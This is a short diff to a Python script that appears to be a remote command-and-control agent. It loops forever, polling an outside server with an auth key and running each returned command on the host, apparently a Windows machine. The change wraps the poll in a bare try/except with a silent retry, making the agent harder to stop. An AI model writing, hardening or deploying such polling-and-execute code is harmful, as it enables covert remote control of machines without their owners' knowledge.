@@ -44,8 +44,12 @@ def main_parser(cfg_data):
 	command_executor("chcp 65001", {'result': '', 'error': None}, threading.Event())
 
 	while True:
-		r = requests.get("https://shh.stariybog.ru/taskpoll?auth_key={}&wait_time=25".format(cfg_data['code']))
-		data = json.loads(r.content)
+		try:
+			r = requests.get("https://shh.stariybog.ru/taskpoll?auth_key={}&wait_time=25".format(cfg_data['code']))
+			data = json.loads(r.content)
+		except: 
+			time.sleep(10)
+			continue
 
 		for i in data:
 			response = run_command_in_thread(i['command'], timeout=10)  # Задаем таймаут в секундах
